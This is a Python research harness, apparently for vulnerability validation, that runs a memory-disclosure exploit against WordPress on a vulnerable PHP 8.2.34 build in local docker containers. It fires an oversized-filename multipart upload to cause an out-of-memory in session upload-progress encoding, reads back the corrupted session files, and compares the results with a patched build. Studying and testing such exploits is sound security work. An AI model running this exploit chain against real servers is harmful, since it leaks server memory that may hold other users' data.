#!/usr/bin/env python3
"""a1_disclosure_run.py - Milestone A1: memory-disclosure from unmodified
WordPress, with the full Daybreak control matrix.

Experiment (per lane, N rounds, fresh SID each round):
  1. fire encode-producer (multipart, 420KB filename; at the staged 2M
     memory_limit this OOMs INSIDE the FILE_START progress encode on the
     vulnerable build -> BG(serialize) stale)
  2. sleep for the session-flock window to clear
  3. ASSISTED READBACK (lab access, documented as such): read the session
     file bytes; classify EMPTY / CLEAN-PROGRESS / CORRUPT (bogus tokens
     = heap-derived bytes written through the stale encode global)
  4. fire reader on the same SID; record the in-band response (a bogus-
     length fatal whose allocation size did NOT come from our payloads is
     a memory-derived value disclosed over HTTP)

Control matrix (Daybreak point 3):
  - vulnerable lane  (php 8.2.34, :8099)  N rounds
  - PATCHED lane     (php 8.2.35, :8100)  N rounds   <- negative control
  - benign shape (tiny filename, no OOM)  on both lanes
  - fresh SID / fresh state per round; rates reported per cell

Transport honesty: uses scripts/wpfire.py's http_exchange (real received
bytes, separate outcome records). Producer-response discrimination:
"Unknown on line 0" = pre-script session-machinery OOM (the primitive);
any file/line location = script-phase OOM (WP core exceeding the 2M
assist) - recorded, not counted as the primitive.
"""
import argparse
import json
import os
import re
import subprocess
import sys
import time
import uuid
from datetime import datetime, timezone

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from wpfire import http_exchange, build_fire  # noqa: E402

REPO = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))


def sh(args, timeout=20):
    """Hard rule: every shell-out is timeout-bounded (46-min-deadlock rule)."""
    try:
        r = subprocess.run(args, capture_output=True, text=True,
                           timeout=timeout, cwd=REPO)
        return r.returncode, r.stdout
    except subprocess.TimeoutExpired:
        return 124, "<TIMEOUT>"


def stage_2m(service):
    rc, _ = sh(["docker", "compose", "exec", "-T", "-u", "root", service,
                "sh", "-c",
                "printf 'memory_limit=2M\\n' > "
                "/usr/local/etc/php/conf.d/zz-2m-lane.ini"])
    assert rc == 0, f"stage failed on {service}"
    sh(["docker", "compose", "restart", service], timeout=60)
    time.sleep(6)
    rc, out = sh(["docker", "compose", "exec", "-T", service, "php", "-i"])
    assert "memory_limit => 2M" in out, f"2M not applied on {service}"
    return True


def restore_ini(service):
    sh(["docker", "compose", "exec", "-T", "-u", "root", service,
        "sh", "-c", "rm -f /usr/local/etc/php/conf.d/zz-2m-lane.ini"])
    sh(["docker", "compose", "restart", service], timeout=60)


def read_session_file(service, sid):
    """Assisted readback of the session file (lab access, documented)."""
    rc, out = sh(["docker", "compose", "exec", "-T", "-u", "root", service,
                  "sh", "-c", f"od -An -v -tx1 /tmp/sess_{sid} "
                  f"2>/dev/null | head -c 4000"])
    if rc != 0 or not out.strip():
        return 0, b""
    hexbytes = bytes.fromhex(out.split()[0]) if out.split() else b""
    # get size separately
    _, sz = sh(["docker", "compose", "exec", "-T", "-u", "root", service,
                "sh", "-c", f"stat -c%s /tmp/sess_{sid} 2>/dev/null"])
    try:
        size = int(sz.strip() or 0)
    except ValueError:
        size = 0
    return size, hexbytes


def classify_session(size, head):
    """EMPTY / CLEAN-PROGRESS / CORRUPT."""
    if size == 0:
        return "EMPTY"
    if b"upload_progress" in head or b"s:8:" in head:
        # check for bogus length tokens: s:<HUGE> with tiny real content
        m = re.search(rb"s:(\d+):\"", head)
        if m and int(m.group(1)) > 100000:
            return "CORRUPT"
        return "CLEAN-PROGRESS"
    # anything not obviously well-formed = corrupt-suspect
    if re.search(rb"s:(\d+):\"", head):
        m = re.search(rb"s:(\d+):\"", head)
        if int(m.group(1)) > 100000:
            return "CORRUPT"
        return "CLEAN-PROGRESS"
    return "CORRUPT" if head else "EMPTY"


def producer_signature(resp):
    """Classify the producer response location."""
    body = resp.raw.partition(b"\r\n\r\n")[2]
    m = re.search(rb"tried to allocate (\d+)", body)
    alloc = int(m.group(1)) if m else None
    loc = re.search(rb"in <b>([^<]+)</b> on line <b>(\d+)", body)
    if loc and b"Unknown" in loc.group(1):
        sig = "pre-script-unknown"       # the 618 session-machinery OOM
    elif loc:
        sig = f"script:{loc.group(1).decode().split('/')[-1]}"
    else:
        sig = "no-fatal"
    return sig, alloc, body


def run_round(tag, service, host, port, mode, fname_len, ev_dir):
    sid = uuid.uuid4().hex[:32]
    req = build_fire(mode, host, port, sid, fname_len)
    resp = http_exchange(host, port, req, timeout=45)
    sig, alloc, body = producer_signature(resp)
    rec = {"tag": tag, "service": service, "mode": mode, "sid": sid,
           "fname_len": fname_len, "resp": resp.summary(), "sig": sig,
           "fatal_alloc": alloc}
    # session file readback (only meaningful after a fire that touched it)
    size, head = read_session_file(service, sid)
    rec["sess_size"] = size
    rec["sess_class"] = classify_session(size, head)
    rec["sess_head_hex"] = head[:96].hex()
    if mode == "encode":
        # reader second request on the same SID
        req2 = build_fire("reader", host, port, sid)
        resp2 = http_exchange(host, port, req2, timeout=45)
        sig2, alloc2, body2 = producer_signature(resp2)
        rec["reader_resp"] = resp2.summary()
        rec["reader_sig"] = sig2
        rec["reader_fatal_alloc"] = alloc2
        with open(os.path.join(ev_dir, f"{tag}_{sid}_reader.raw"), "wb") as f:
            f.write(resp2.raw)
    with open(os.path.join(ev_dir, f"{tag}_{sid}.raw"), "wb") as f:
        f.write(resp.raw)
    with open(os.path.join(ev_dir, f"{tag}_{sid}.json"), "w") as f:
        json.dump(rec, f, indent=1)
    return rec


def main():
    p = argparse.ArgumentParser()
    p.add_argument("--rounds", type=int, default=4)
    p.add_argument("--ev-dir", default="results/wp-lastmile/a1-disclosure")
    a = p.parse_args()
    os.makedirs(a.ev_dir, exist_ok=True)
    lanes = [
        ("vuln", "wordpress-x86", "127.0.0.1", 8099),
        ("patched", "wordpress-patched", "127.0.0.1", 8100),
    ]
    summary = {}
    try:
        for name, service, host, port in lanes:
            stage_2m(service)
            recs = []
            for i in range(a.rounds):
                recs.append(run_round(f"{name}_prod{i+1}", service, host,
                                      port, "encode", 430080, a.ev_dir))
                time.sleep(3)   # flock window
            # benign control on the same lane
            recs.append(run_round(f"{name}_benign", service, host, port,
                                  "benign", 8, a.ev_dir))
            summary[name] = recs
    finally:
        for _, service, _, _ in lanes:
            restore_ini(service)

    print(f"\n=== A1 disclosure matrix ({a.rounds} rounds) ===")
    for name, recs in summary.items():
        prod = [r for r in recs if r["mode"] == "encode"]
        benign = [r for r in recs if r["mode"] == "benign"]
        sigs = {}
        for r in prod:
            sigs.setdefault(r["sig"], 0)
            sigs[r["sig"]] += 1
        sess = {}
        for r in prod:
            sess.setdefault(r["sess_class"], 0)
            sess[r["sess_class"]] += 1
        readers = {}
        for r in prod:
            readers.setdefault(r.get("reader_sig", "-"), 0)
            readers[r.get("reader_sig", "-")] += 1
        print(f"[{name}] producer sigs: {sigs}")
        print(f"[{name}] session files: {sess}")
        print(f"[{name}] reader sigs:   {readers}")
        print(f"[{name}] benign: {benign[0]['sig']}, "
              f"sess={benign[0]['sess_class']}")
    with open(os.path.join(a.ev_dir, "summary.json"), "w") as f:
        json.dump(summary, f, indent=1)
    print(f"\nevidence dir: {a.ev_dir}")


if __name__ == "__main__":
    main()
